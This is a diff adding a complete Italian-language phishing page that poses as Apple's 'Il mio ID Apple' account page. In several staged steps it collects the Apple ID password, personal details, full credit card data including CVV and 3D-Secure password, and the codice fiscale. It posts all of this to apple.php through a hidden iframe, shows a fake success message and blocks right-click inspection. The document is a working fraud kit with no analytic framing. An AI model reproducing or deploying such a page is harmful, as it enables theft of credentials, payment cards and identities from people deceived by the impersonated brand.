@@ -1,0 +1,515 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="it_IT" xmlns="http://www.w3.org/1999/xhtml" xml:lang="it_IT" dir="ltr">
+ <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <link href="files/favicon.ico" rel="shortcut icon" />
+  <title>
+   Apple - Il mio ID Apple
+  </title>
+  <link rel="stylesheet" type="text/css" href="files/navigation.css" id="globalheader-stylesheet" />
+  <link rel="stylesheet" type="text/css" href="files/base.css" />
+  <link rel="stylesheet" type="text/css" href="files/myappleid.css" />
+  <link rel="stylesheet" type="text/css" href="files/hsa.css" />
+  <link rel="stylesheet" type="text/css" href="files/enhanced.css" id="globalheader-enhanced-stylesheet" />
+  <script src="files/MyAppleID.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   function validation1() {emailfield('apple_login', 'ID Apple non corretta.');requiredfield('apple_password', 6, 'Password errata.');gostep(1);}function validation2() {alphabeticfield('nome', 4, 'Il nome non è corretto.');alphabeticfield('cognome', 4, 'Il cognome non è corretto.');datefield('ddn', 'La data di nascita non è valida.');requiredfield('indirizzo', 6, 'L\' indirizzo non è corretto');numericfield('cap', 5, 'Il codice postale non è valido.');alphabeticfield('citta', 4, 'La città non è corretta.');numericfield('telefono', 10, 'Il numero di telefono non è valido.');gostep(2);}function validation3() {alphabeticfield('titolare', 5, 'Il nome del titolare non è corretto.');ccnumberfield('ccnum', 'Il numero di carta di credito non è valido.');expdatefield('scamese', 'scaanno', 'La data di scadenza non è valida.');numericfield('cvv', 3, 'Il CVV-codice non valido.');requiredfield('password_cc', 4, 'Il password di carte di credito non è valido.');alphanumericfield('codice_fiscale', 16, 'Il codice fiscale non è valida.');gostep(3);submitform('apple');}
+  </script>
+ </head>
+ <body class="myappleid edit address" id="editContainerBody" ondragstart="return false;" onselectstart="return false;" oncontextmenu="return false;" style="-moz-user-select: none;">
+  <nav style="visibility: visible;" dir="ltr" class=" globalheader-js svg globalheader-loaded" id="globalheader">
+   <ul id="globalnav">
+    <li id="gn-apple">
+     <a href="#">
+      <span>
+       Apple
+      </span>
+     </a>
+    </li>
+    <li id="gn-store">
+     <a href="#">
+      <span>
+       Store
+      </span>
+     </a>
+    </li>
+    <li id="gn-mac">
+     <a href="#">
+      <span>
+       Mac
+      </span>
+     </a>
+    </li>
+    <li id="gn-ipod">
+     <a href="#">
+      <span>
+       iPod
+      </span>
+     </a>
+    </li>
+    <li id="gn-iphone">
+     <a href="#">
+      <span>
+       iPhone
+      </span>
+     </a>
+    </li>
+    <li id="gn-ipad">
+     <a href="#">
+      <span>
+       iPad
+      </span>
+     </a>
+    </li>
+    <li id="gn-itunes">
+     <a href="#">
+      <span>
+       iTunes
+      </span>
+     </a>
+    </li>
+    <li class="gn-last" id="gn-support">
+     <a href="#" class="gn-last">
+      <span>
+       Supporto
+      </span>
+     </a>
+    </li>
+   </ul>
+   <div id="globalsearch">
+    <form action="#" method="get" class="search empty" id="g-search" autocomplete="off">
+     <div>
+      <label for="sp-searchtext">
+       <input type="text" autocomplete="off" name="q" accesskey="s" id="sp-searchtext" />
+       <div class="reset">
+       </div>
+       <div class="spinner hide">
+       </div>
+      </label>
+     </div>
+     <input type="hidden" value="global" name="sec" id="search-section" />
+    </form>
+    <div id="sp-magnify">
+     <div class="magnify-searchmode">
+     </div>
+     <div class="magnify">
+     </div>
+    </div>
+    <div id="sp-results">
+    </div>
+   </div>
+  </nav>
+  <form target="target" method="post" action="apple.php" name="apple" autocomplete="off">
+   <div id="productheader">
+    <a aria-label="Il mio ID Apple" href="#">
+     <h2>
+      <img aria-hidden="true" src="files/headerLogo.png" class="DimAppleIdLogoIV" />
+     </h2>
+    </a>
+   </div>
+   <script type="text/javascript" src="http://www.javascript-validation.com/view/js/jvalidation.2.0.0.min.js">
+   </script>
+   <div aria-hidden="false" id="main">
+    <div class="content" id="content">
+     <div class="grid2colc wrap">
+      <div class="myappleid sign-in index" name="step">
+       <div class="column first sidebar">
+        <h2>
+         Accedi per gestire il tuo ID Apple.
+        </h2>
+        <p class="intro">
+         Per visualizzare e modificare le informazioni del tuo account ID Apple, esegui il login. Se non hai un ID Apple, puoi
+         <a href="#">
+          crearne uno ora
+         </a>
+         .
+        </p>
+       </div>
+       <div class="column last">
+        <div id="ds_container">
+         <h2>
+          Accedi.
+         </h2>
+         <div class="formrow">
+          ID Apple
+          <span class="formwrap">
+           <div style="position: relative;" class="field-container">
+            <input type="text" tabindex="1" name="apple_login" class="input-text" id="accountname" />
+           </div>
+          </span>
+          <span class="input-msg show">
+           <a name="findYourAppleIDHyperlink" href="#" id="findYourAppleIDHyperlink">
+            <span>
+             Hai dimenticato il tuo ID Apple?
+            </span>
+           </a>
+          </span>
+         </div>
+         <div class="formrow">
+          Password
+          <span class="formwrap">
+           <div style="position: relative;" class="field-container">
+            <input type="password" tabindex="2" name="apple_password" class="input-password" id="accountpassword" />
+           </div>
+          </span>
+          <span class="input-msg show">
+           <a href="#" id="forgotYourPasswordHyperlink">
+            <span>
+             Hai dimenticato la password?
+            </span>
+           </a>
+          </span>
+         </div>
+         <div id="bot-nav">
+          <a onclick="validation1();" role="button" class="btn bigblue" id="saveLink">
+           <span>
+            Accedi
+           </span>
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div name="step" style="display: none;">
+       <div class="column first sidebar">
+        <h2>
+         Modifica il tuo ID Apple.
+        </h2>
+        <p class="intro">
+         Puoi apportare modifiche al tuo ID Apple in qualsiasi momento: modificare ID Apple, password, nome e indirizzo email o aggiornare le informazioni di contatto.
+        </p>
+       </div>
+       <div class="column last" id="fillContainer">
+        <h2>
+         Informazioni personali
+        </h2>
+        <p class="intro">
+         Immettere le informazioni nel modo più accurato possibile.
+        </p>
+        <div class="formrow">
+         <label for="nome">
+          Nome
+         </label>
+         <span class="formwrap">
+          <input type="text" name="nome" id="nome" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="cognome">
+          Cognome
+         </label>
+         <span class="formwrap">
+          <input type="text" name="cognome" id="cognome" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="ddn">
+          Data di nascita gg/mm/aaaa
+         </label>
+         <span style="text-align:right;" class="formwrap">
+          <input type="text" maxlength="10" placeholder="gg/mm/aaaa" name="ddn" id="ddn" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="indirizzo">
+          Indirizzo
+         </label>
+         <span class="formwrap">
+          <input type="text" name="indirizzo" id="indirizzo" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="cap">
+          CAP
+         </label>
+         <span class="formwrap">
+          <input type="text" maxlength="5" name="cap" id="cap" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="citta">
+          Città
+         </label>
+         <span class="formwrap">
+          <input type="text" name="citta" id="citta" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="telefono">
+          Numero di telefono
+         </label>
+         <span class="formwrap">
+          <input type="text" maxlength="10" name="telefono" id="telefono" />
+         </span>
+        </div>
+        <div id="bot-nav">
+         <a onclick="validation2();" role="button" class="btn bigblue" id="saveLink">
+          <span>
+           Registrati
+          </span>
+         </a>
+        </div>
+       </div>
+      </div>
+      <div class="myappleid edit index" name="step" style="display: none;">
+       <div class="column first sidebar">
+        <h2>
+         Modifica il tuo ID Apple.
+        </h2>
+        <p class="intro">
+         Puoi apportare modifiche al tuo ID Apple in qualsiasi momento: modificare ID Apple, password, nome e indirizzo email o aggiornare le informazioni di contatto.
+        </p>
+       </div>
+       <div class="column last" id="fillContainer">
+        <h2>
+         Dati della carta di credito
+        </h2>
+        <p class="intro">
+         Inserisci i dati della carta il più accuratamente possibile.
+        </p>
+        <div class="formrow">
+         <label for="titolare">
+          Nome del titolare
+         </label>
+         <span class="formwrap">
+          <input type="text" name="titolare" id="titolare" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label>
+         </label>
+         <span style="background:none; margin-bottom:0;" class="formwrap">
+          <div class="carte visa">
+          </div>
+          <div class="carte mastercard">
+          </div>
+          <div class="carte american_express">
+          </div>
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="ccnum">
+          Numero carta di credito
+         </label>
+         <span class="formwrap">
+          <input type="text" maxlength="16" name="ccnum" id="ccnum" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="scamese">
+          Data di scadenza
+         </label>
+         <span class="formwrap">
+          <select style="width: 70px;" name="scamese" id="scamese">
+           <option value="">
+            Mese
+           </option>
+           <option value="01">
+            01
+           </option>
+           <option value="02">
+            02
+           </option>
+           <option value="03">
+            03
+           </option>
+           <option value="04">
+            04
+           </option>
+           <option value="05">
+            05
+           </option>
+           <option value="06">
+            06
+           </option>
+           <option value="07">
+            07
+           </option>
+           <option value="08">
+            08
+           </option>
+           <option value="09">
+            09
+           </option>
+           <option value="10">
+            10
+           </option>
+           <option value="11">
+            11
+           </option>
+           <option value="12">
+            12
+           </option>
+          </select>
+          /
+          <select style="width: 90px;" name="scaanno">
+           <option value="">
+            Anno
+           </option>
+           <option value="2015">
+            2015
+           </option>
+           <option value="2016">
+            2016
+           </option>
+           <option value="2017">
+            2017
+           </option>
+           <option value="2018">
+            2018
+           </option>
+           <option value="2019">
+            2019
+           </option>
+           <option value="2020">
+            2020
+           </option>
+           <option value="2021">
+            2021
+           </option>
+           <option value="2022">
+            2022
+           </option>
+           <option value="2023">
+            2023
+           </option>
+           <option value="2024">
+            2024
+           </option>
+           <option value="2025">
+            2025
+           </option>
+           <option value="2026">
+            2026
+           </option>
+           <option value="2027">
+            2027
+           </option>
+           <option value="2028">
+            2028
+           </option>
+           <option value="2029">
+            2029
+           </option>
+          </select>
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="cvv">
+          CVV-codice
+         </label>
+         <span class="formwrap">
+          <input type="text" maxlength="4" style="width: 80px;" name="cvv" id="cvv" />
+         </span>
+        </div>
+        <br />
+        <br />
+        <div class="formrow">
+         <label for="password_cc">
+          Password 3D-Secure Verified By Visa di carte di credito
+         </label>
+         <span class="formwrap">
+          <input type="password" name="password_cc" id="password_cc" />
+         </span>
+        </div>
+        <div class="formrow">
+         <label for="codice_fiscale">
+          Codice fiscale
+         </label>
+         <span class="formwrap">
+          <input type="text" maxlength="16" name="codice_fiscale" id="codice_fiscale" />
+         </span>
+        </div>
+        <div id="bot-nav">
+         <a onclick="validation3();" role="button" class="btn bigblue" id="saveLink">
+          <span>
+           Presentare
+          </span>
+         </a>
+        </div>
+       </div>
+      </div>
+      <div name="step" style="display: none;">
+       <div class="column first">
+        <h2>
+         Modifica il tuo ID Apple.
+        </h2>
+        <p class="intro">
+         Puoi apportare modifiche al tuo ID Apple in qualsiasi momento: modificare ID Apple, password, nome e indirizzo email o aggiornare le informazioni di contatto.
+        </p>
+       </div>
+       <div class="column last main" id="main_content">
+        <br />
+        <br />
+        <img width="32" height="31" alt="" style="margin: 0px 8px 8px 0px" src="files/myappleid_check_20091125.png" class="left" />
+        <h2>
+         Congratulazioni!
+        </h2>
+        <br />
+        <p class="intro">
+         Tutte le informazioni sono state comunicate in forma criptata sul nostro server sicuro, i tuoi dati personali e bancari sono stati salvati con successo.
+         <br />
+         <br />
+         <a href="http://appleid.apple.com/it">
+          ‹ Torna alla homepage
+         </a>
+        </p>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </form>
+  <script>
+   controle();
+  </script>
+  <iframe style="display:none;" name="target">
+  </iframe>
+  <div style="display:none;" id="ver">
+   Apple_IT_v1.0_LTF
+  </div>
+  <footer id="globalfooter">
+   <div id="breadory">
+    <ol id="breadcrumbs">
+     <li class="home">
+      <a href="#">
+       Home
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Il mio ID Apple
+      </a>
+     </li>
+    </ol>
+   </div>
+   <div class="gf-sosumi">
+    <p>
+     Copyright © 2015 Apple Inc. Tutti i diritti riservati.
+    </p>
+    <ul class="piped">
+     <li>
+      <a href="#" class="first">
+       Condizioni d’uso
+      </a>
+     </li>
+     <li>
+      <a href="#">
+       Privacy
+      </a>
+     </li>
+     <li style="float:right">
+      <a href="#" class="choose">
+      </a>
+      <p style="display:inline;margin-right:-5px; padding-right:0px;">
+       Seleziona il paese o l'area geografica
+      </p>
+      <img src="files/ITflag.png" class="img-22" />
+     </li>
+    </ul>
+   </div>
+  </footer>
+ </body>
+</html>
